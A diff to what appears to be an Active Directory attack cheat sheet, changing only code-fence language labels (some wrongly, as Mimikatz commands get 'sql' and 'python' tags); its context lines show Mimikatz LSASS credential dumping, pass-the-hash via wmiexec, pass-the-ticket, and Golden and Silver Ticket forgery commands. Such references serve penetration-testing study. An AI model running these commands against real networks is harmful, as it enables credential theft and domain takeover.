@@ -47,7 +47,7 @@ hashcat -m 18200 asrep_hashes.txt wordlist.txt
 ```
 
 ## Credential Harvesting with Mimikatz
-```
+```sql
 privilege::debug                        # Get debug privilege
 sekurlsa::logonpasswords               # Dump cleartext passwords from LSASS
 sekurlsa::wdigest                      # WDigest passwords
@@ -65,7 +65,7 @@ wmiexec.py -hashes :NTLM_HASH Administrator@10.0.0.1
 ```
 
 ## Pass-the-Ticket (PtT)
-```
+```python
 # Export ticket from memory (Mimikatz)
 kerberos::list /export
 # Import on another machine
@@ -74,7 +74,7 @@ kerberos::ptt ticket.kirbi
 
 ## Golden Ticket
 Forged TGT with domain admin privileges. Requires KRBTGT NTLM hash + Domain SID:
-```
+```bash
 kerberos::golden /user:FakeAdmin /domain:corp.local \
   /sid:S-1-5-21-... /krbtgt:HASH /ptt
 ```
@@ -84,7 +84,7 @@ kerberos::golden /user:FakeAdmin /domain:corp.local \
 
 ## Silver Ticket
 Forged TGS for a specific service (does not contact KDC):
-```
+```bash
 kerberos::golden /user:FakeUser /domain:corp.local \
   /sid:S-1-5-21-... /target:server.corp.local \
   /service:cifs /rc4:SERVICE_HASH /ptt
